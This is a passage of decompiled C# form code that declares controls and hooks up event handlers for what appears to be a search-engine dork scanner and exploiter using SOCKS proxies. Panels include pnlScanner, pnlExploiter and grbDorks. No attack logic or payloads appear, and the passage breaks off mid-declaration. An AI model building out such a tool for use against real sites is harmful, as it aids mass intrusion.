	// (set) Token: 0x06000BC2 RID: 3010 RVA: 0x00006CCA File Offset: 0x00004ECA
	internal virtual ToolStrip tslNotepad { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700037F RID: 895
	// (get) Token: 0x06000BC3 RID: 3011 RVA: 0x00006CD3 File Offset: 0x00004ED3
	// (set) Token: 0x06000BC4 RID: 3012 RVA: 0x00006CDB File Offset: 0x00004EDB
	internal virtual ToolStripButton btnNotepadOpen { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000380 RID: 896
	// (get) Token: 0x06000BC5 RID: 3013 RVA: 0x00006CE4 File Offset: 0x00004EE4
	// (set) Token: 0x06000BC6 RID: 3014 RVA: 0x00006CEC File Offset: 0x00004EEC
	internal virtual ToolStripSeparator toolStripSeparator5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000381 RID: 897
	// (get) Token: 0x06000BC7 RID: 3015 RVA: 0x00006CF5 File Offset: 0x00004EF5
	// (set) Token: 0x06000BC8 RID: 3016 RVA: 0x00006CFD File Offset: 0x00004EFD
	internal virtual ToolStripButton btnNotepadSave { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000382 RID: 898
	// (get) Token: 0x06000BC9 RID: 3017 RVA: 0x00006D06 File Offset: 0x00004F06
	// (set) Token: 0x06000BCA RID: 3018 RVA: 0x00006D0E File Offset: 0x00004F0E
	internal virtual ToolStripSeparator toolStripSeparator7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000383 RID: 899
	// (get) Token: 0x06000BCB RID: 3019 RVA: 0x00006D17 File Offset: 0x00004F17
	// (set) Token: 0x06000BCC RID: 3020 RVA: 0x00006D1F File Offset: 0x00004F1F
	internal virtual ToolStripButton btnNotepadClear { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000384 RID: 900
	// (get) Token: 0x06000BCD RID: 3021 RVA: 0x00006D28 File Offset: 0x00004F28
	// (set) Token: 0x06000BCE RID: 3022 RVA: 0x00006D30 File Offset: 0x00004F30
	internal virtual ToolStripLabel ToolStripLabel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000385 RID: 901
	// (get) Token: 0x06000BCF RID: 3023 RVA: 0x00006D39 File Offset: 0x00004F39
	// (set) Token: 0x06000BD0 RID: 3024 RVA: 0x00006D41 File Offset: 0x00004F41
	internal virtual Panel pnlAbout { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000386 RID: 902
	// (get) Token: 0x06000BD1 RID: 3025 RVA: 0x00006D4A File Offset: 0x00004F4A
	// (set) Token: 0x06000BD2 RID: 3026 RVA: 0x00006D52 File Offset: 0x00004F52
	internal virtual Panel pnlSockList { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000387 RID: 903
	// (get) Token: 0x06000BD3 RID: 3027 RVA: 0x00006D5B File Offset: 0x00004F5B
	// (set) Token: 0x06000BD4 RID: 3028 RVA: 0x00006D63 File Offset: 0x00004F63
	internal virtual Panel pnlSettings { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000388 RID: 904
	// (get) Token: 0x06000BD5 RID: 3029 RVA: 0x00006D6C File Offset: 0x00004F6C
	// (set) Token: 0x06000BD6 RID: 3030 RVA: 0x00006D74 File Offset: 0x00004F74
	internal virtual Label lblHTTPtimeout { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000389 RID: 905
	// (get) Token: 0x06000BD7 RID: 3031 RVA: 0x00006D7D File Offset: 0x00004F7D
	// (set) Token: 0x06000BD8 RID: 3032 RVA: 0x00006D85 File Offset: 0x00004F85
	internal virtual Label lblHTTPretry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700038A RID: 906
	// (get) Token: 0x06000BD9 RID: 3033 RVA: 0x00006D8E File Offset: 0x00004F8E
	// (set) Token: 0x06000BDA RID: 3034 RVA: 0x00056778 File Offset: 0x00054978
	internal virtual ContextMenuStrip mnuListView
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_158);
			ContextMenuStrip mnuChecked = this._mnuChecked;
			if (mnuChecked != null)
			{
				mnuChecked.Opening -= value2;
			}
			this._mnuChecked = value;
			mnuChecked = this._mnuChecked;
			if (mnuChecked != null)
			{
				mnuChecked.Opening += value2;
			}
		}
	}

	// Token: 0x1700038B RID: 907
	// (get) Token: 0x06000BDB RID: 3035 RVA: 0x00006D96 File Offset: 0x00004F96
	// (set) Token: 0x06000BDC RID: 3036 RVA: 0x000567BC File Offset: 0x000549BC
	internal virtual ToolStripMenuItem mnuLWClipboard
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWClipboard;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_161);
			ToolStripMenuItem mnuLWClipboard = this._mnuLWClipboard;
			if (mnuLWClipboard != null)
			{
				mnuLWClipboard.Click -= value2;
			}
			this._mnuLWClipboard = value;
			mnuLWClipboard = this._mnuLWClipboard;
			if (mnuLWClipboard != null)
			{
				mnuLWClipboard.Click += value2;
			}
		}
	}

	// Token: 0x1700038C RID: 908
	// (get) Token: 0x06000BDD RID: 3037 RVA: 0x00006D9E File Offset: 0x00004F9E
	// (set) Token: 0x06000BDE RID: 3038 RVA: 0x00056800 File Offset: 0x00054A00
	internal virtual ToolStripMenuItem mnuLWSelectAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWSelectAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_162);
			ToolStripMenuItem mnuLWSelectAll = this._mnuLWSelectAll;
			if (mnuLWSelectAll != null)
			{
				mnuLWSelectAll.Click -= value2;
			}
			this._mnuLWSelectAll = value;
			mnuLWSelectAll = this._mnuLWSelectAll;
			if (mnuLWSelectAll != null)
			{
				mnuLWSelectAll.Click += value2;
			}
		}
	}

	// Token: 0x1700038D RID: 909
	// (get) Token: 0x06000BDF RID: 3039 RVA: 0x00006DA6 File Offset: 0x00004FA6
	// (set) Token: 0x06000BE0 RID: 3040 RVA: 0x00056844 File Offset: 0x00054A44
	internal virtual ToolStripMenuItem mnuLWExport
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWExport;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_167);
			ToolStripMenuItem mnuLWExport = this._mnuLWExport;
			if (mnuLWExport != null)
			{
				mnuLWExport.Click -= value2;
			}
			this._mnuLWExport = value;
			mnuLWExport = this._mnuLWExport;
			if (mnuLWExport != null)
			{
				mnuLWExport.Click += value2;
			}
		}
	}

	// Token: 0x1700038E RID: 910
	// (get) Token: 0x06000BE1 RID: 3041 RVA: 0x00006DAE File Offset: 0x00004FAE
	// (set) Token: 0x06000BE2 RID: 3042 RVA: 0x00006DB6 File Offset: 0x00004FB6
	internal virtual ToolStripSeparator mnuLWSelectAllSP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700038F RID: 911
	// (get) Token: 0x06000BE3 RID: 3043 RVA: 0x00006DBF File Offset: 0x00004FBF
	// (set) Token: 0x06000BE4 RID: 3044 RVA: 0x00056888 File Offset: 0x00054A88
	internal virtual ToolStripMenuItem mnuLWRemove
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWRemove;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_169);
			ToolStripMenuItem mnuLWRemove = this._mnuLWRemove;
			if (mnuLWRemove != null)
			{
				mnuLWRemove.Click -= value2;
			}
			this._mnuLWRemove = value;
			mnuLWRemove = this._mnuLWRemove;
			if (mnuLWRemove != null)
			{
				mnuLWRemove.Click += value2;
			}
		}
	}

	// Token: 0x17000390 RID: 912
	// (get) Token: 0x06000BE5 RID: 3045 RVA: 0x00006DC7 File Offset: 0x00004FC7
	// (set) Token: 0x06000BE6 RID: 3046 RVA: 0x00006DCF File Offset: 0x00004FCF
	internal virtual ImageList imgData { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000391 RID: 913
	// (get) Token: 0x06000BE7 RID: 3047 RVA: 0x00006DD8 File Offset: 0x00004FD8
	// (set) Token: 0x06000BE8 RID: 3048 RVA: 0x000568CC File Offset: 0x00054ACC
	internal virtual BackgroundWorker bcWorker
	{
		[CompilerGenerated]
		get
		{
			return this.backgroundWorker_0;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ProgressChangedEventHandler value2 = new ProgressChangedEventHandler(this.method_27);
			RunWorkerCompletedEventHandler value3 = new RunWorkerCompletedEventHandler(this.method_28);
			BackgroundWorker backgroundWorker = this.backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.ProgressChanged -= value2;
				backgroundWorker.RunWorkerCompleted -= value3;
			}
			this.backgroundWorker_0 = value;
			backgroundWorker = this.backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.ProgressChanged += value2;
				backgroundWorker.RunWorkerCompleted += value3;
			}
		}
	}

	// Token: 0x17000392 RID: 914
	// (get) Token: 0x06000BE9 RID: 3049 RVA: 0x00006DE0 File Offset: 0x00004FE0
	// (set) Token: 0x06000BEA RID: 3050 RVA: 0x00006DE8 File Offset: 0x00004FE8
	internal virtual ToolStrip tsSocks { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000393 RID: 915
	// (get) Token: 0x06000BEB RID: 3051 RVA: 0x00006DF1 File Offset: 0x00004FF1
	// (set) Token: 0x06000BEC RID: 3052 RVA: 0x0005692C File Offset: 0x00054B2C
	internal virtual ToolStripButton btnSocksAppend
	{
		[CompilerGenerated]
		get
		{
			return this._btnSocksAppend;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_200);
			ToolStripButton btnSocksAppend = this._btnSocksAppend;
			if (btnSocksAppend != null)
			{
				btnSocksAppend.Click -= value2;
			}
			this._btnSocksAppend = value;
			btnSocksAppend = this._btnSocksAppend;
			if (btnSocksAppend != null)
			{
				btnSocksAppend.Click += value2;
			}
		}
	}

	// Token: 0x17000394 RID: 916
	// (get) Token: 0x06000BED RID: 3053 RVA: 0x00006DF9 File Offset: 0x00004FF9
	// (set) Token: 0x06000BEE RID: 3054 RVA: 0x00006E01 File Offset: 0x00005001
	internal virtual ToolStripSeparator ToolStripSeparator15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000395 RID: 917
	// (get) Token: 0x06000BEF RID: 3055 RVA: 0x00006E0A File Offset: 0x0000500A
	// (set) Token: 0x06000BF0 RID: 3056 RVA: 0x00056970 File Offset: 0x00054B70
	internal virtual ToolStripButton btnSocksClear
	{
		[CompilerGenerated]
		get
		{
			return this._btnSocksClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_199);
			ToolStripButton btnSocksClear = this._btnSocksClear;
			if (btnSocksClear != null)
			{
				btnSocksClear.Click -= value2;
			}
			this._btnSocksClear = value;
			btnSocksClear = this._btnSocksClear;
			if (btnSocksClear != null)
			{
				btnSocksClear.Click += value2;
			}
		}
	}

	// Token: 0x17000396 RID: 918
	// (get) Token: 0x06000BF1 RID: 3057 RVA: 0x00006E12 File Offset: 0x00005012
	// (set) Token: 0x06000BF2 RID: 3058 RVA: 0x00006E1A File Offset: 0x0000501A
	internal virtual ToolStripLabel ToolStripLabel9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000397 RID: 919
	// (get) Token: 0x06000BF3 RID: 3059 RVA: 0x00006E23 File Offset: 0x00005023
	// (set) Token: 0x06000BF4 RID: 3060 RVA: 0x000569B4 File Offset: 0x00054BB4
	internal virtual ToolStripButton btnSocksTest
	{
		[CompilerGenerated]
		get
		{
			return this._btnSocksTest;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_198);
			ToolStripButton btnSocksTest = this._btnSocksTest;
			if (btnSocksTest != null)
			{
				btnSocksTest.Click -= value2;
			}
			this._btnSocksTest = value;
			btnSocksTest = this._btnSocksTest;
			if (btnSocksTest != null)
			{
				btnSocksTest.Click += value2;
			}
		}
	}

	// Token: 0x17000398 RID: 920
	// (get) Token: 0x06000BF5 RID: 3061 RVA: 0x00006E2B File Offset: 0x0000502B
	// (set) Token: 0x06000BF6 RID: 3062 RVA: 0x00006E33 File Offset: 0x00005033
	internal virtual ToolStripSeparator ToolStripSeparator16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000399 RID: 921
	// (get) Token: 0x06000BF7 RID: 3063 RVA: 0x00006E3C File Offset: 0x0000503C
	// (set) Token: 0x06000BF8 RID: 3064 RVA: 0x000569F8 File Offset: 0x00054BF8
	internal virtual ToolStripButton btnSocksNew
	{
		[CompilerGenerated]
		get
		{
			return this._btnSocksNew;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_197);
			ToolStripButton btnSocksNew = this._btnSocksNew;
			if (btnSocksNew != null)
			{
				btnSocksNew.Click -= value2;
			}
			this._btnSocksNew = value;
			btnSocksNew = this._btnSocksNew;
			if (btnSocksNew != null)
			{
				btnSocksNew.Click += value2;
			}
		}
	}

	// Token: 0x1700039A RID: 922
	// (get) Token: 0x06000BF9 RID: 3065 RVA: 0x00006E44 File Offset: 0x00005044
	// (set) Token: 0x06000BFA RID: 3066 RVA: 0x00056A3C File Offset: 0x00054C3C
	internal virtual ContextMenuStrip mnuSocks
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_192);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_1;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_1 = value;
			mnuChecked_ = this._mnuChecked_1;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x1700039B RID: 923
	// (get) Token: 0x06000BFB RID: 3067 RVA: 0x00006E4C File Offset: 0x0000504C
	// (set) Token: 0x06000BFC RID: 3068 RVA: 0x00056A80 File Offset: 0x00054C80
	internal virtual ToolStripMenuItem mnuSocksSelectAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSocksSelectAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_193);
			ToolStripMenuItem mnuSocksSelectAll = this._mnuSocksSelectAll;
			if (mnuSocksSelectAll != null)
			{
				mnuSocksSelectAll.Click -= value2;
			}
			this._mnuSocksSelectAll = value;
			mnuSocksSelectAll = this._mnuSocksSelectAll;
			if (mnuSocksSelectAll != null)
			{
				mnuSocksSelectAll.Click += value2;
			}
		}
	}

	// Token: 0x1700039C RID: 924
	// (get) Token: 0x06000BFD RID: 3069 RVA: 0x00006E54 File Offset: 0x00005054
	// (set) Token: 0x06000BFE RID: 3070 RVA: 0x00006E5C File Offset: 0x0000505C
	internal virtual ToolStripSeparator ToolStripMenuItem5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700039D RID: 925
	// (get) Token: 0x06000BFF RID: 3071 RVA: 0x00006E65 File Offset: 0x00005065
	// (set) Token: 0x06000C00 RID: 3072 RVA: 0x00056AC4 File Offset: 0x00054CC4
	internal virtual ToolStripMenuItem mnuSocksRemove
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSocksRemove;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_194);
			ToolStripMenuItem mnuSocksRemove = this._mnuSocksRemove;
			if (mnuSocksRemove != null)
			{
				mnuSocksRemove.Click -= value2;
			}
			this._mnuSocksRemove = value;
			mnuSocksRemove = this._mnuSocksRemove;
			if (mnuSocksRemove != null)
			{
				mnuSocksRemove.Click += value2;
			}
		}
	}

	// Token: 0x1700039E RID: 926
	// (get) Token: 0x06000C01 RID: 3073 RVA: 0x00006E6D File Offset: 0x0000506D
	// (set) Token: 0x06000C02 RID: 3074 RVA: 0x00056B08 File Offset: 0x00054D08
	internal virtual ToolStripMenuItem mnuSocksCheck
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSocksCheck;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_195);
			ToolStripMenuItem mnuSocksCheck = this._mnuSocksCheck;
			if (mnuSocksCheck != null)
			{
				mnuSocksCheck.Click -= value2;
			}
			this._mnuSocksCheck = value;
			mnuSocksCheck = this._mnuSocksCheck;
			if (mnuSocksCheck != null)
			{
				mnuSocksCheck.Click += value2;
			}
		}
	}

	// Token: 0x1700039F RID: 927
	// (get) Token: 0x06000C03 RID: 3075 RVA: 0x00006E75 File Offset: 0x00005075
	// (set) Token: 0x06000C04 RID: 3076 RVA: 0x00056B4C File Offset: 0x00054D4C
	internal virtual ToolStripMenuItem mnuSocksUnCheck
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSocksUnCheck;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_196);
			ToolStripMenuItem mnuSocksUnCheck = this._mnuSocksUnCheck;
			if (mnuSocksUnCheck != null)
			{
				mnuSocksUnCheck.Click -= value2;
			}
			this._mnuSocksUnCheck = value;
			mnuSocksUnCheck = this._mnuSocksUnCheck;
			if (mnuSocksUnCheck != null)
			{
				mnuSocksUnCheck.Click += value2;
			}
		}
	}

	// Token: 0x170003A0 RID: 928
	// (get) Token: 0x06000C05 RID: 3077 RVA: 0x00006E7D File Offset: 0x0000507D
	// (set) Token: 0x06000C06 RID: 3078 RVA: 0x00006E85 File Offset: 0x00005085
	internal virtual ToolStripSeparator mnuLWRemoveSP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003A1 RID: 929
	// (get) Token: 0x06000C07 RID: 3079 RVA: 0x00006E8E File Offset: 0x0000508E
	// (set) Token: 0x06000C08 RID: 3080 RVA: 0x00056B90 File Offset: 0x00054D90
	internal virtual CheckBox chkSkin
	{
		[CompilerGenerated]
		get
		{
			return this._chkSkin;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_123);
			CheckBox chkSkin = this._chkSkin;
			if (chkSkin != null)
			{
				chkSkin.CheckedChanged -= value2;
			}
			this._chkSkin = value;
			chkSkin = this._chkSkin;
			if (chkSkin != null)
			{
				chkSkin.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x170003A2 RID: 930
	// (get) Token: 0x06000C09 RID: 3081 RVA: 0x00006E96 File Offset: 0x00005096
	// (set) Token: 0x06000C0A RID: 3082 RVA: 0x00056BD4 File Offset: 0x00054DD4
	internal virtual ComboBox cmbSkin
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSkin;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_122);
			ComboBox cmbSkin = this._cmbSkin;
			if (cmbSkin != null)
			{
				cmbSkin.SelectedIndexChanged -= value2;
			}
			this._cmbSkin = value;
			cmbSkin = this._cmbSkin;
			if (cmbSkin != null)
			{
				cmbSkin.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x170003A3 RID: 931
	// (get) Token: 0x06000C0B RID: 3083 RVA: 0x00006E9E File Offset: 0x0000509E
	// (set) Token: 0x06000C0C RID: 3084 RVA: 0x00056C18 File Offset: 0x00054E18
	internal virtual Button btnSkinN
	{
		[CompilerGenerated]
		get
		{
			return this._btnSkinN;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_121);
			Button btnSkinN = this._btnSkinN;
			if (btnSkinN != null)
			{
				btnSkinN.Click -= value2;
			}
			this._btnSkinN = value;
			btnSkinN = this._btnSkinN;
			if (btnSkinN != null)
			{
				btnSkinN.Click += value2;
			}
		}
	}

	// Token: 0x170003A4 RID: 932
	// (get) Token: 0x06000C0D RID: 3085 RVA: 0x00006EA6 File Offset: 0x000050A6
	// (set) Token: 0x06000C0E RID: 3086 RVA: 0x00056C5C File Offset: 0x00054E5C
	internal virtual Button btnSkinP
	{
		[CompilerGenerated]
		get
		{
			return this._btnSkinP;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_120);
			Button btnSkinP = this._btnSkinP;
			if (btnSkinP != null)
			{
				btnSkinP.Click -= value2;
			}
			this._btnSkinP = value;
			btnSkinP = this._btnSkinP;
			if (btnSkinP != null)
			{
				btnSkinP.Click += value2;
			}
		}
	}

	// Token: 0x170003A5 RID: 933
	// (get) Token: 0x06000C0F RID: 3087 RVA: 0x00006EAE File Offset: 0x000050AE
	// (set) Token: 0x06000C10 RID: 3088 RVA: 0x00006EB6 File Offset: 0x000050B6
	internal virtual Panel pnlNotepad { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003A6 RID: 934
	// (get) Token: 0x06000C11 RID: 3089 RVA: 0x00006EBF File Offset: 0x000050BF
	// (set) Token: 0x06000C12 RID: 3090 RVA: 0x00006EC7 File Offset: 0x000050C7
	internal virtual ContextMenuStrip mnuAbout { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003A7 RID: 935
	// (get) Token: 0x06000C13 RID: 3091 RVA: 0x00006ED0 File Offset: 0x000050D0
	// (set) Token: 0x06000C14 RID: 3092 RVA: 0x00056CA0 File Offset: 0x00054EA0
	internal virtual ToolStripMenuItem mnuAboutClipboard
	{
		[CompilerGenerated]
		get
		{
			return this._mnuAboutClipboard;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_118);
			ToolStripMenuItem mnuAboutClipboard = this._mnuAboutClipboard;
			if (mnuAboutClipboard != null)
			{
				mnuAboutClipboard.Click -= value2;
			}
			this._mnuAboutClipboard = value;
			mnuAboutClipboard = this._mnuAboutClipboard;
			if (mnuAboutClipboard != null)
			{
				mnuAboutClipboard.Click += value2;
			}
		}
	}

	// Token: 0x170003A8 RID: 936
	// (get) Token: 0x06000C15 RID: 3093 RVA: 0x00006ED8 File Offset: 0x000050D8
	// (set) Token: 0x06000C16 RID: 3094 RVA: 0x00006EE0 File Offset: 0x000050E0
	internal virtual Panel pnlScanner { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003A9 RID: 937
	// (get) Token: 0x06000C17 RID: 3095 RVA: 0x00006EE9 File Offset: 0x000050E9
	// (set) Token: 0x06000C18 RID: 3096 RVA: 0x00006EF1 File Offset: 0x000050F1
	internal virtual Panel pnlExploiter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003AA RID: 938
	// (get) Token: 0x06000C19 RID: 3097 RVA: 0x00006EFA File Offset: 0x000050FA
	// (set) Token: 0x06000C1A RID: 3098 RVA: 0x00006F02 File Offset: 0x00005102
	internal virtual Panel pnlTrash { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003AB RID: 939
	// (get) Token: 0x06000C1B RID: 3099 RVA: 0x00006F0B File Offset: 0x0000510B
	// (set) Token: 0x06000C1C RID: 3100 RVA: 0x00006F13 File Offset: 0x00005113
	internal virtual GroupBox grbDorks { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003AC RID: 940
	// (get) Token: 0x06000C1D RID: 3101 RVA: 0x00006F1C File Offset: 0x0000511C
	// (set) Token: 0x06000C1E RID: 3102 RVA: 0x00056CE4 File Offset: 0x00054EE4
	internal virtual TextBox txtMultiDorks
	{
		[CompilerGenerated]
		get
		{
			return this._txtMultiDorks;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_34);
			EventHandler value3 = new EventHandler(this.method_35);
			TextBox txtMultiDorks = this._txtMultiDorks;
			if (txtMultiDorks != null)
			{
				txtMultiDorks.TextChanged -= value2;
				txtMultiDorks.Leave -= value3;
			}
			this._txtMultiDorks = value;
			txtMultiDorks = this._txtMultiDorks;
			if (txtMultiDorks != null)
			{
				txtMultiDorks.TextChanged += value2;
				txtMultiDorks.Leave += value3;
			}
		}
	}

	// Token: 0x170003AD RID: 941
	// (get) Token: 0x06000C1F RID: 3103 RVA: 0x00006F24 File Offset: 0x00005124
	// (set) Token: 0x06000C20 RID: 3104 RVA: 0x00056D44 File Offset: 0x00054F44
	internal virtual CheckedListBox lstSearchEngine
	{
		[CompilerGenerated]
		get
		{
			return this._lstSearchEngine;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_33);
			ItemCheckEventHandler value3 = new ItemCheckEventHandler(this.method_107);
			CheckedListBox lstSearchEngine = this._lstSearchEngine;
			if (lstSearchEngine != null)
			{
				lstSearchEngine.Leave -= value2;
				lstSearchEngine.ItemCheck -= value3;
			}
			this._lstSearchEngine = value;
			lstSearchEngine = this._lstSearchEngine;
			if (lstSearchEngine != null)
			{
				lstSearchEngine.Leave += value2;
				lstSearchEngine.ItemCheck += value3;
			}
		}
	}

	// Token: 0x170003AE RID: 942
	// (get) Token: 0x06000C21 RID: 3105 RVA: 0x00006F2C File Offset: 0x0000512C
	// (set) Token: 0x06000C22 RID: 3106 RVA: 0x00006F34 File Offset: 0x00005134
	internal virtual GroupBox grbScannerURL { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003AF RID: 943
	// (get) Token: 0x06000C23 RID: 3107 RVA: 0x00006F3D File Offset: 0x0000513D
	// (set) Token: 0x06000C24 RID: 3108 RVA: 0x00006F45 File Offset: 0x00005145
	internal virtual Panel pnlWindows { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003B0 RID: 944
	// (get) Token: 0x06000C25 RID: 3109 RVA: 0x00006F4E File Offset: 0x0000514E
	// (set) Token: 0x06000C26 RID: 3110 RVA: 0x00006F56 File Offset: 0x00005156
	internal virtual Panel pnlControls { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003B1 RID: 945
	// (get) Token: 0x06000C27 RID: 3111 RVA: 0x00006F5F File Offset: 0x0000515F
	// (set) Token: 0x06000C28 RID: 3112 RVA: 0x00006F67 File Offset: 0x00005167
	internal virtual Panel grbHttpLog { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003B2 RID: 946
	// (get) Token: 0x06000C29 RID: 3113 RVA: 0x00006F70 File Offset: 0x00005170
	// (set) Token: 0x06000C2A RID: 3114 RVA: 0x00056DA4 File Offset: 0x00054FA4
	internal virtual ContextMenuStrip mnuHttpLog
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_6;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_209);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_6;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_6 = value;
			mnuChecked_ = this._mnuChecked_6;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x170003B3 RID: 947
	// (get) Token: 0x06000C2B RID: 3115 RVA: 0x00006F78 File Offset: 0x00005178
	// (set) Token: 0x06000C2C RID: 3116 RVA: 0x00056DE8 File Offset: 0x00054FE8
	internal virtual ToolStripMenuItem mnuHttpLogClear
	{
		[CompilerGenerated]
		get
		{
			return this._mnuHttpLogClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_204);
			ToolStripMenuItem mnuHttpLogClear = this._mnuHttpLogClear;
			if (mnuHttpLogClear != null)
			{
				mnuHttpLogClear.Click -= value2;
			}
			this._mnuHttpLogClear = value;
			mnuHttpLogClear = this._mnuHttpLogClear;
			if (mnuHttpLogClear != null)
			{
				mnuHttpLogClear.Click += value2;
			}
		}
	}

	// Token: 0x170003B4 RID: 948
	// (get) Token: 0x06000C2D RID: 3117 RVA: 0x00006F80 File Offset: 0x00005180
	// (set) Token: 0x06000C2E RID: 3118 RVA: 0x00006F88 File Offset: 0x00005188
	internal virtual ToolStripSeparator ToolStripSeparator4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003B5 RID: 949
	// (get) Token: 0x06000C2F RID: 3119 RVA: 0x00006F91 File Offset: 0x00005191
	// (set) Token: 0x06000C30 RID: 3120 RVA: 0x00056E2C File Offset: 0x0005502C
	internal virtual ToolStripMenuItem mnuHttpLogAutoScroll
